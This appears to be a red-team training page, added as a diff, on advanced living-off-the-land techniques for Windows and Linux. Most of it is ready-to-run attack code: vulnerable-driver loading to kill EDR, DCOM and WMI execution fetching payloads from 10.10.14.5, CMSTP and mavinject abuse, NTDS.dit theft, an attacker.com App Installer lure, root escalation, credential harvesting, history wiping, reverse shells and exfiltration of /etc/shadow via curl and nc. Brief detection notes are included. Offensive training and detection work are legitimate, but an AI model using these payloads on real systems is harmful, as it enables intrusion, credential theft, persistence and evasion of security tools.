@@ -1,0 +1,387 @@
+---
+layout: training-page
+title: "Advanced LOTL Techniques — Red Team Academy"
+module: "Evasion"
+tags:
+  - lotl
+  - byovd
+  - loldrivers
+  - wmi
+  - dcom
+  - cmstp
+  - mavinject
+page_key: "evasion-lotl-advanced"
+---
+<h1>Advanced Living Off the Land Techniques</h1>
+
+  <h2>Overview</h2>
+  <p>This module extends basic LOLBins (certutil, mshta, rundll32 — covered in the LOLBins module) to advanced techniques: vulnerable driver abuse, COM/DCOM lateral movement, WMI persistence, UAC bypass via CMSTP, and signed-binary process injection. These techniques operate entirely within legitimate OS components, making detection harder and attribution ambiguous.</p>
+
+  <h2>LOLDrivers — Bring Your Own Vulnerable Driver (BYOVD)</h2>
+  <p>BYOVD abuses legitimately signed but vulnerable kernel drivers to gain kernel-level code execution. Because the driver is signed, it loads without Secure Boot interference. Once in kernel space, the driver can terminate EDR processes, remove kernel callbacks, and manipulate kernel objects directly.</p>
+  <p>Reference: <strong>loldrivers.io</strong> — community-maintained catalog of vulnerable drivers with IOCTL interfaces for exploitation.</p>
+  <pre><code># Step 1 — load the vulnerable driver:
+# sc.exe creates a kernel service pointing to the driver binary
+sc.exe create RTCore64 type= kernel start= demand binPath= C:\Windows\Temp\RTCore64.sys
+sc.exe start RTCore64
+
+# Step 2 — interact with the driver via DeviceIoControl:
+# RTCore64.sys (MSI Afterburner) — IOCTL 0x80002048 allows arbitrary kernel memory R/W
+# Typical use: locate EDR callback arrays in kernel memory, zero them out
+
+# Step 3 — remove EDR process protection and kill it:
+# EDR processes run as PPL (Protected Process Light)
+# BYOVD changes the protection level in EPROCESS before terminating
+# Once protection is stripped, TerminateProcess() succeeds from userland
+
+# Commonly abused drivers:
+# RTCore64.sys   — MSI Afterburner, arbitrary R/W, CVE (unsigned IOCTLs)
+# gdrv.sys       — GIGABYTE driver, arbitrary kernel memory R/W
+# mhyprot2.sys   — Genshin Impact anti-cheat, arbitrary memory R/W
+# WinRing0x64.sys — CPUID/MSR read/write primitive
+# AsrDrv101.sys  — ASRock driver
+
+# KDMapper — loads unsigned drivers by exploiting a signed one:
+KDMapper.exe payload.sys
+# KDMapper uses iqvw64e.sys (Intel driver) to manually map an arbitrary driver
+# without going through Windows driver loading (bypasses DSE — Driver Signature Enforcement)</code></pre>
+
+  <h3>EDR Kernel Callback Removal</h3>
+  <p>EDRs register callbacks in kernel via routines like <code>PsSetCreateProcessNotifyRoutine</code>. The kernel stores these in a callback array. With a kernel R/W primitive, the array entries can be zeroed, blinding the EDR to process creation events.</p>
+  <pre><code># Callbacks targeted:
+# PsSetCreateProcessNotifyRoutine   — process creation events
+# PsSetCreateThreadNotifyRoutine    — thread creation events
+# PsSetLoadImageNotifyRoutine       — image/DLL load events
+# CmRegisterCallback                — registry events
+# ObRegisterCallbacks               — object access (handle duplication)
+
+# The process (pseudocode):
+# 1. Use kernel R/W primitive to read PsSetCreateProcessNotifyRoutineEx array address
+# 2. Iterate the array, identify EDR driver entries by module name
+# 3. Zero the callback pointer — EDR receives no more process creation events
+
+# Tools implementing callback removal:
+# EDRSandBlast — open source, removes callbacks + ETW providers via BYOVD
+# Backstab     — OST tool, targets PPL-protected EDR processes
+# (see Outflank OST module for Backstab details)</code></pre>
+
+  <h2>COM Object Abuse — Local Execution</h2>
+  <p>COM (Component Object Model) objects are instantiable via CLSIDs. Many legitimate COM objects expose interfaces that execute code, spawn processes, or load files. Abusing COM objects avoids direct process creation from the attacker's binary.</p>
+  <pre><code># ShellExecute via Shell.Application COM object:
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
+$com.ShellExecute("powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')", "", "open", 0)
+
+# Process creation via WScript.Shell:
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.Run("cmd.exe /c whoami > C:\Windows\Temp\out.txt", 0, $false)
+
+# Schedule task via Schedule.Service COM object:
+$svc = New-Object -ComObject Schedule.Service
+$svc.Connect()
+$folder = $svc.GetFolder("\")
+$taskDef = $svc.NewTask(0)
+$taskDef.Settings.Hidden = $true
+$action = $taskDef.Actions.Create(0)
+$action.Path = "powershell.exe"
+$action.Arguments = "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
+$trigger = $taskDef.Triggers.Create(1)  # 1 = time trigger
+$trigger.StartBoundary = "2023-01-01T00:00:00"
+$folder.RegisterTaskDefinition("MicrosoftEdgeUpdate", $taskDef, 6, $null, $null, 3)
+$folder.GetTask("MicrosoftEdgeUpdate").Run($null)</code></pre>
+
+  <h2>DCOM Lateral Movement</h2>
+  <p>Distributed COM (DCOM) exposes COM objects over the network. Several DCOM objects on remote Windows hosts accept method calls that result in code execution. Requires admin credentials on the target. Traffic travels over port 135 (RPC endpoint mapper) and high RPC ports.</p>
+  <pre><code># MMC20.Application — ExecuteShellCommand (classic DCOM lateral movement):
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.10"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -nop -w hidden -enc BASE64PAYLOAD", "7")
+
+# ShellWindows DCOM object:
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "192.168.1.10"))
+# Enumerate ShellWindows to get a reference:
+$item = $dcom.Windows() | Where-Object &#123; $_.LocationURL -match "explorer" &#125; | Select-Object -First 1
+$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\out.txt", "C:\Windows\System32", $null, 0)
+
+# ShellBrowserWindow:
+$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID([System.Guid]"C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.1.10"))
+$dcom.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
+
+# Outlook DCOM (if Outlook installed on target):
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "192.168.1.10"))
+$shell = $dcom.CreateObject("WScript.Shell")
+$shell.Run("powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')")
+
+# Detection: Event 4624 (logon), 4648 (explicit creds), DCOM activation in System log
+# OPSEC: DCOM over 135 blends with normal Windows traffic; shellcode in memory avoids disk</code></pre>
+
+  <h2>WMI Event Subscription Persistence</h2>
+  <p>WMI event subscriptions execute code when specific system events fire — user login, process start, timer expiry. Subscriptions survive reboots and are stored in the WMI repository (<code>%WINDIR%\System32\wbem\Repository</code>). WMI-based persistence is fileless from the perspective of the file system.</p>
+  <pre><code># Three objects required:
+# __EventFilter        — defines the triggering condition (WQL query)
+# __EventConsumer      — defines the action (CommandLineEventConsumer, ActiveScriptEventConsumer)
+# __FilterToConsumerBinding — links Filter to Consumer
+
+# PowerShell — create WMI persistence via CommandLineEventConsumer:
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @&#123;
+    Name = "WindowsUpdate"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
+&#125;
+
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @&#123;
+    Name = "WindowsUpdate"
+    ExecutablePath = "C:\Windows\System32\cmd.exe"
+    CommandLineTemplate = "cmd.exe /c powershell -nop -w hidden -enc BASE64PAYLOAD"
+&#125;
+
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @&#123;
+    Filter = $Filter
+    Consumer = $Consumer
+&#125;
+
+# Verify the subscription exists:
+Get-WmiObject -Namespace root\subscription -Class __EventFilter
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+# Cleanup (remove after operation):
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object &#123; $_.Name -eq "WindowsUpdate" &#125; | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object &#123; $_.Name -eq "WindowsUpdate" &#125; | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
+
+# ActiveScriptEventConsumer — executes VBScript/JScript (more flexible):
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @&#123;
+    Name = "WindowsUpdate"
+    ScriptingEngine = "VBScript"
+    ScriptText = "Set obj = CreateObject(`"WScript.Shell`")`nobj.Run `"powershell -nop -w hidden -enc BASE64`", 0, False"
+&#125;
+
+# Detection:
+# - Sysmon Event 20 (WmiEventFilter), 21 (WmiEventConsumer), 22 (WmiEventConsumerToFilter)
+# - WMI-Activity/Operational log: Microsoft-Windows-WMI-Activity/Operational
+# - Autoruns.exe (Sysinternals) shows WMI subscriptions under WMI tab</code></pre>
+
+  <h2>CMSTP.exe — UAC Bypass and Code Execution</h2>
+  <p>CMSTP (Microsoft Connection Manager Profile Installer) installs network connection profiles from INF files. It can be used to: (1) execute arbitrary code via a malicious INF, and (2) auto-elevate via COM object bypass, granting a UAC bypass without a consent prompt on standard installations.</p>
+  <pre><code># CMSTP location:
+# C:\Windows\System32\cmstp.exe
+
+# INF file template for code execution (payload.inf):
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,http://10.10.14.5/shell.sct    ; remote SCT execution
+
+# Alternative INF — execute local command via RunPreSetupCommands:
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
+
+[Strings]
+ServiceName="VPN"
+ShortSvcName="VPN"
+
+# Execute CMSTP with the INF:
+cmstp.exe /au payload.inf      ; /au = AllUsers, triggers auto-elevation
+cmstp.exe /s payload.inf       ; /s = silent
+
+# UAC Bypass technique:
+# CMSTP auto-elevates when invoked from a high-integrity process
+# Use CMSTP COM object (CLSID: 3E4FF7F4-6FA4-4D7E-91E5-27B5B6E41C70) to bypass consent UI:
+# The COM object calls into cmstp in a way that bypasses UAC prompt
+# This is listed in UACME (UACMe project) as bypass #37
+
+# Detection:
+# - Event 4688 (process creation): cmstp.exe with /au or /s flags
+# - Parent process anomaly (cmstp spawned by non-standard parent)
+# - Sysmon Event 1: CommandLine contains cmstp with INF file path</code></pre>
+
+  <h2>Mavinject.exe — Signed DLL Injection</h2>
+  <p>Mavinject (Microsoft Application Virtualization Injector) is a Microsoft-signed binary that injects DLLs into running processes. It was originally part of App-V (Application Virtualization). Since it is signed by Microsoft, it passes application whitelisting checks while performing process injection.</p>
+  <pre><code># Location: C:\Windows\System32\mavinject.exe
+# Syntax: mavinject.exe [PID] /INJECTRUNNING [DLL_PATH]
+
+# Find a suitable target PID (a stable, long-running process):
+Get-Process explorer | Select-Object Id      # Explorer PID
+Get-Process svchost | Select-Object Id       # Svchost (pick one)
+
+# Inject DLL into explorer.exe (PID 4512):
+mavinject.exe 4512 /INJECTRUNNING C:\Windows\Temp\payload.dll
+
+# The DLL must:
+# - Export DllMain (standard DLL entry point)
+# - Execute shellcode/backdoor from within DllMain
+# - Handle DLL_PROCESS_ATTACH to trigger on injection
+
+# Limitations:
+# - Requires admin or SeDebugPrivilege to inject into most processes
+# - The target process must be running (not suspended)
+# - DLL path must be accessible from the target process context
+# - EDRs detect the use of mavinject.exe due to its unusual usage pattern
+
+# OPSEC: rename or copy to a different location — behavior-based EDRs
+# may flag mavinject.exe by process name or image hash
+# Better: use mavinject as a template and implement DLL injection manually</code></pre>
+
+  <h2>Odbcconf.exe — DLL Registration Execution</h2>
+  <p>ODBC Configuration Manager is a Microsoft-signed binary that processes ODBC driver configuration. Its <code>/A</code> flag accepts actions including <code>REGSVR</code>, which calls <code>DllRegisterServer</code> on any specified DLL — a LOLBin for executing code from a DLL without going through regsvr32.</p>
+  <pre><code># odbcconf.exe — execute DllRegisterServer on a DLL:
+odbcconf.exe /A &#123;REGSVR C:\Windows\Temp\payload.dll&#125;
+
+# Execute a response file (RSP) containing ODBC actions:
+odbcconf.exe /f payload.rsp
+
+# payload.rsp contents:
+[ODBC]
+DRIVER=payload.dll
+
+# odbcconf with regsvr action — functionally equivalent to regsvr32:
+odbcconf.exe -f C:\Windows\Temp\payload.rsp
+
+# Detection: odbcconf.exe invocation outside normal ODBC driver installation context
+# Parent process anomaly (rundll32, cmd, powershell spawning odbcconf)</code></pre>
+
+  <h2>DiskShadow.exe — VSS Abuse and Code Execution</h2>
+  <p>DiskShadow manages Volume Shadow Copy Service (VSS). It accepts script files and can execute arbitrary commands via its <code>exec</code> directive. Used to copy protected files (NTDS.dit) and for code execution through a trusted binary.</p>
+  <pre><code># DiskShadow script file (shadow.txt) for NTDS.dit copy:
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% z:
+exec "cmd.exe /c copy z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit"
+delete shadows volume %cdrive%
+reset
+
+# Execute the script:
+diskshadow.exe /s C:\Windows\Temp\shadow.txt
+
+# Code execution via exec directive:
+set verbose on
+exec "cmd.exe /c powershell -nop -w hidden -enc BASE64PAYLOAD"
+
+diskshadow.exe /s exec.txt
+
+# After copying NTDS.dit, also copy the SYSTEM hive (needed for decryption):
+reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+
+# Offline extraction:
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</code></pre>
+
+  <h2>AppInstaller.exe — 1-Click MSIX Delivery</h2>
+  <p>Windows 10/11 App Installer handles <code>.appinstaller</code> and <code>ms-appinstaller://</code> URI scheme. A crafted URI in a browser or document launches App Installer which downloads and prompts installation of a malicious MSIX package. Bypasses SmartScreen in some configurations and delivers code execution through a GUI install flow.</p>
+  <pre><code"># ms-appinstaller URI scheme triggers App Installer:
+# In HTML/phishing email link:
+ms-appinstaller:?source=https://attacker.com/payload.appinstaller
+
+# .appinstaller XML manifest pointing to MSIX:
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;AppInstaller Uri="https://attacker.com/payload.appinstaller" Version="1.0.0.0"
+    xmlns="http://schemas.microsoft.com/appx/appinstaller/2017/2"&gt;
+  &lt;MainPackage Name="CorpVPN" Version="1.0.0.0" Publisher="CN=Corp IT"
+      Uri="https://attacker.com/CorpVPN.msix" ProcessorArchitecture="x64" /&gt;
+&lt;/AppInstaller&gt;
+
+# MSIX package is a ZIP containing:
+# - AppxManifest.xml
+# - Application executable (payload)
+# - AppxBlockMap.xml, AppxSignature.p7x (self-signed cert)
+
+# The application runs in a lightweight App Container sandbox
+# but can be used for initial foothold with further privesc
+
+# Note: Microsoft disabled ms-appinstaller by default in February 2022
+# due to abuse by Magniber and Emotet operators — but it can be re-enabled
+# via Group Policy and some enterprise configs still allow it</code></pre>
+
+  <h2>Linux Advanced LOTL</h2>
+  <pre><code># LD_PRELOAD for privilege escalation (when SUID binary present):
+# Compile shared library that runs code in constructor:
+cat &gt; /tmp/priv.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() &#123;
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+&#125;
+EOF
+gcc -fPIC -shared -nostartfiles -o /tmp/priv.so /tmp/priv.c
+sudo LD_PRELOAD=/tmp/priv.so /usr/bin/find   # run any sudo-allowed binary
+
+# /proc for credential harvesting:
+# Read environment variables from running processes (may contain secrets):
+for pid in /proc/[0-9]*/environ; do cat "$pid" 2>/dev/null | tr '\0' '\n'; done | grep -i "pass\|key\|secret\|token"
+
+# Read process memory maps to find loaded secrets:
+cat /proc/$(pgrep python3 | head -1)/maps
+strings /proc/$(pgrep python3 | head -1)/mem 2>/dev/null | grep -i "password"
+
+# Bash history manipulation:
+unset HISTFILE                         # disable history for current session
+export HISTFILE=/dev/null              # redirect history to /dev/null
+history -c && history -w               # clear existing history
+ln -sf /dev/null ~/.bash_history       # permanent: symlink to /dev/null
+
+# SSH authorized_keys persistence:
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+echo "ssh-rsa AAAA...ATTACKERKEY... attacker" &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+# Also add to root if accessible:
+echo "ssh-rsa AAAA...ATTACKERKEY... attacker" &gt;&gt; /root/.ssh/authorized_keys
+
+# Cron-based persistence:
+(crontab -l 2&gt;/dev/null; echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'") | crontab -
+# System-wide cron (requires root):
+echo "* * * * * root /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'" &gt;&gt; /etc/crontab
+
+# dd for data exfil (binary copy over network):
+dd if=/etc/shadow | gzip | base64 | curl -s --data-binary @- http://10.10.14.5/collect
+dd if=/dev/sda bs=512 count=2048 | gzip | nc 10.10.14.5 9001  # boot sector/MBR
+
+# Python one-liners for persistence:
+# Write file:
+python3 -c "open('/etc/cron.d/update','w').write('* * * * * root bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"\n')"
+# Reverse shell:
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"</code></pre>
+
+  <h2>Detection Summary</h2>
+  <pre><code># Key detection events for advanced LOTL:
+# BYOVD:
+#   - Suspicious driver load: Sysmon Event 6 (DriverLoad) for non-standard drivers
+#   - sc.exe creating kernel services from temp directories
+#   - KDMapper creates a service named "iqvw64e"
+
+# DCOM lateral movement:
+#   - Event 4624 (network logon) from unexpected source
+#   - DCOM activation events in System log
+#   - Network connections on port 135 + dynamic RPC ports from non-standard processes
+
+# WMI persistence:
+#   - Sysmon Events 20/21/22 (WMI filter/consumer/binding)
+#   - Microsoft-Windows-WMI-Activity/Operational log
+#   - WMI repository changes
+
+# CMSTP:
+#   - Event 4688: cmstp.exe with /au or /s flags
+#   - Child processes of cmstp.exe
+
+# Mavinject:
+#   - Event 4688: mavinject.exe with /INJECTRUNNING
+#   - Sysmon Event 8 (CreateRemoteThread) targeting unexpected processes</code></pre>
